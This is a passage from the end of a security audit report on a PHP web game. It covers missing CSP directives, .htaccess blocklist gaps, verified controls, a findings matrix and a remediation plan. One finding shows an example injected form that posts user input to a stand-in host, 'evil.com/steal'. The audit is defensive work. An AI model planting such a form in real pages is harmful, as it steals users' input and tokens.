```

---

### INFRA-R2-031 [LOW] CSP missing form-action directive

**File:** `/home/guortates/TVLW/The-Very-Little-War/.htaccess` line 7

**Description:** The CSP policy does not include a `form-action` directive. Without it, an injected form can submit data to any origin. An attacker who injects `<form action="https://evil.com/steal">` captures user input (including CSRF tokens if the user interacts with the fake form).

**Impact:** Form submission to arbitrary origins via content injection.

**Fix:** Add to CSP:
```
form-action 'self';
```

---

### INFRA-R2-032 [LOW] .htaccess does not block composer.json, composer.lock, phpunit.xml

**File:** `/home/guortates/TVLW/The-Very-Little-War/.htaccess` line 14

**Description:** While `.json` is blocked by the `FilesMatch` rule (which catches `composer.json`), `phpunit.xml` and `phpunit.xml.dist` would be blocked by the `.xml` rule. However, `.lock` is listed but `composer.lock` is in `.gitignore`. This is adequate for current files but worth noting for completeness: any new configuration file with an unlisted extension would be exposed.

**Impact:** Informational -- current protections are adequate for known file types.

**Fix:** No immediate action needed. The existing rules are sufficient.

---

## Informational

### INFRA-R2-033 [INFO] Security controls already implemented correctly

The following security controls were verified as correctly implemented:

1. **Prepared statements:** All database queries use `dbQuery()`, `dbFetchOne()`, `dbFetchAll()`, `dbExecute()` with parameterized bindings. No raw string concatenation in SQL. Verified across `database.php`, `basicprivatephp.php`, `basicpublicphp.php`, and all form-handling pages.

2. **CSRF protection:** All POST forms include `csrfField()` and all POST handlers call `csrfCheck()`. Token uses `bin2hex(random_bytes(32))` (256-bit entropy). Verification uses `hash_equals()` for timing-safe comparison.

3. **Session security:** Session tokens are stored in database and verified on every private page load (`basicprivatephp.php:10-16`). Session IDs are regenerated every 30 minutes (`basicprivatephp.php:19-22`). Idle timeout of 1 hour (`basicprivatephp.php:47-51`). Logout properly clears DB token, destroys session, and clears cookie (`deconnexion.php`).

4. **Password hashing:** Uses `password_hash()` with `PASSWORD_DEFAULT` (bcrypt). MD5 passwords are auto-migrated on login (`basicpublicphp.php:48-55`). Admin password is stored as a bcrypt hash, not plaintext.

5. **File upload handling:** Extension whitelist (jpg, jpeg, png, gif), MIME type validation via `finfo`, `getimagesize()` validation, size limit, random filename generation via `uniqid()`. Upload directory has PHP execution disabled and file type restrictions via `.htaccess`.

6. **Rate limiting:** Login (10 attempts per 5 minutes per IP), registration (3 per hour per IP), API (60 per minute per IP). Implemented and functional.

7. **Directory listing:** Disabled via `Options -Indexes`.

8. **Dotfile protection:** `<FilesMatch "^\.">` blocks all hidden files including `.env`, `.git`, `.htaccess` (the `.htaccess` itself is processed by Apache, not served).

9. **Logs directory:** Protected with `Deny from all` via its own `.htaccess`.

10. **Docs directory:** Protected with `Require all denied` via its own `.htaccess`.

11. **XSS protection:** `htmlspecialchars()` with `ENT_QUOTES` and `UTF-8` used consistently. `antiXSS()` wrapper function applied to all `$_GET` parameter output.

12. **Input validation:** `validateLogin()` enforces `[a-zA-Z0-9_]{3,20}`. `validateEmail()` uses `FILTER_VALIDATE_EMAIL`. `validatePositiveInt()` and `validateRange()` provide numeric validation.

13. **Migration security:** `migrate.php` has no web-accessible parameters -- it only reads SQL files from the local directory. SQL files contain only DDL operations (ALTER TABLE, CREATE TABLE, ADD INDEX). No data manipulation or credential insertion found in migration files.

---

## Summary Matrix

| ID | Severity | Component | Description |
|----|----------|-----------|-------------|
| INFRA-R2-001 | CRITICAL | .htaccess CSP | unsafe-inline in script-src defeats XSS protection |
| INFRA-R2-002 | CRITICAL | .htaccess | No HSTS header |
| INFRA-R2-003 | CRITICAL | session_init.php | session.cookie_secure conditional |
| INFRA-R2-004 | HIGH | .htaccess | mod_php directives ignored under PHP-FPM |
| INFRA-R2-005 | HIGH | .htaccess | error_reporting E_ALL in production |
| INFRA-R2-006 | HIGH | .htaccess | Missing Permissions-Policy header |
| INFRA-R2-007 | HIGH | session_init.php | Missing use_only_cookies and use_trans_sid |
| INFRA-R2-008 | HIGH | /tests/ | No .htaccess protection |
| INFRA-R2-009 | HIGH | /vendor/ | No .htaccess protection |
| INFRA-R2-010 | HIGH | /migrations/ | No .htaccess, migrate.php web-accessible |
| INFRA-R2-011 | HIGH | rate_limiter.php | /tmp storage, race conditions |
| INFRA-R2-012 | HIGH | connexion.php | Error messages expose app info, wrong HTTP status |
| INFRA-R2-013 | MEDIUM | database.php | SQL query text in error logs |
| INFRA-R2-014 | MEDIUM | logger.php | No log injection protection |
| INFRA-R2-015 | MEDIUM | logger.php | No log rotation |
| INFRA-R2-016 | MEDIUM | logger.php | Log dir permissions 0755 |
| INFRA-R2-017 | MEDIUM | csrf.php | Single CSRF token per session |
| INFRA-R2-018 | MEDIUM | .htaccess | FilesMatch does not explicitly block .env |
| INFRA-R2-019 | MEDIUM | .htaccess | FilesMatch missing many dangerous extensions |
| INFRA-R2-020 | MEDIUM | .htaccess | X-XSS-Protection deprecated |
| INFRA-R2-021 | MEDIUM | connexion.php | No connection timeout, wrong charset |
| INFRA-R2-022 | MEDIUM | basicprivatephp.php | No Cache-Control on authenticated pages |
| INFRA-R2-023 | MEDIUM | images/profil/.htaccess | PHP execution block only for mod_php |
| INFRA-R2-024 | LOW | .htaccess CSP | img-src overly permissive |
| INFRA-R2-025 | LOW | .htaccess | Headers use "set" not "always set" |
| INFRA-R2-026 | LOW | .htaccess | Missing COOP/CORP headers |
| INFRA-R2-027 | LOW | inscription.php | Email logged in plaintext (GDPR) |
| INFRA-R2-028 | LOW | basicprivatephp.php | IP tracking GDPR and proxy concerns |
| INFRA-R2-029 | LOW | env.php | No env var name validation |
| INFRA-R2-030 | LOW | .htaccess CSP | Missing base-uri directive |
| INFRA-R2-031 | LOW | .htaccess CSP | Missing form-action directive |
| INFRA-R2-032 | LOW | .htaccess | Extension blocklist completeness |

---

## Remediation Priority

### Immediate (before HTTPS activation)

1. **CRITICAL:** Remove `unsafe-inline` from CSP `script-src` via nonce or external JS (INFRA-R2-001)
2. **HIGH:** Add `.htaccess` deny-all to `/tests/`, `/vendor/`, `/migrations/` (INFRA-R2-008, 009, 010) -- 2 minutes, zero risk
3. **HIGH:** Add `session.use_only_cookies = 1` and `session.use_trans_sid = 0` to session_init.php (INFRA-R2-007)
4. **HIGH:** Add runtime `ini_set('display_errors', '0')` in session_init.php as PHP-FPM fallback (INFRA-R2-004)
5. **HIGH:** Add `Permissions-Policy` header to .htaccess (INFRA-R2-006)

### When enabling HTTPS

6. **CRITICAL:** Hardcode `session.cookie_secure = 1` (INFRA-R2-003)
7. **CRITICAL:** Add HSTS header (INFRA-R2-002)
8. **HIGH:** Reduce error_reporting to 24575 (INFRA-R2-005)

### Short-term (within 1 week)

9. **HIGH:** Fix connexion.php error handling with proper HTTP status codes (INFRA-R2-012)
10. **HIGH:** Address rate limiter storage and race conditions (INFRA-R2-011)
11. **MEDIUM:** Add log injection protection (INFRA-R2-014)
12. **MEDIUM:** Set up logrotate (INFRA-R2-015)
13. **MEDIUM:** Add Cache-Control headers to authenticated pages (INFRA-R2-022)
14. **MEDIUM:** Expand FilesMatch extensions (INFRA-R2-018, 019)
15. **MEDIUM:** Fix upload dir PHP execution block for FPM (INFRA-R2-023)
16. **MEDIUM:** Add connection timeout and utf8mb4 charset (INFRA-R2-021)

### Ongoing hardening

17. **MEDIUM:** Fix X-XSS-Protection to "0" (INFRA-R2-020)
18. **MEDIUM:** SQL query text redaction in error logs (INFRA-R2-013)
19. **MEDIUM:** Log directory permissions (INFRA-R2-016)
20. **LOW:** Add base-uri, form-action to CSP (INFRA-R2-030, 031)
21. **LOW:** Switch to "always set" for security headers (INFRA-R2-025)
22. **LOW:** Add COOP/CORP headers (INFRA-R2-026)
23. **LOW:** Remove email from registration logs (INFRA-R2-027)
24. **LOW:** Tighten img-src CSP (INFRA-R2-024)
25. **LOW:** Add env var name validation (INFRA-R2-029)

---

**Total findings:** 32 (3 CRITICAL, 9 HIGH, 11 MEDIUM, 9 LOW)
**Files analyzed:** 15 PHP files, 3 .htaccess files, 14 migration SQL files, 1 .gitignore
**Correctly implemented controls:** 13 verified (see INFRA-R2-033)
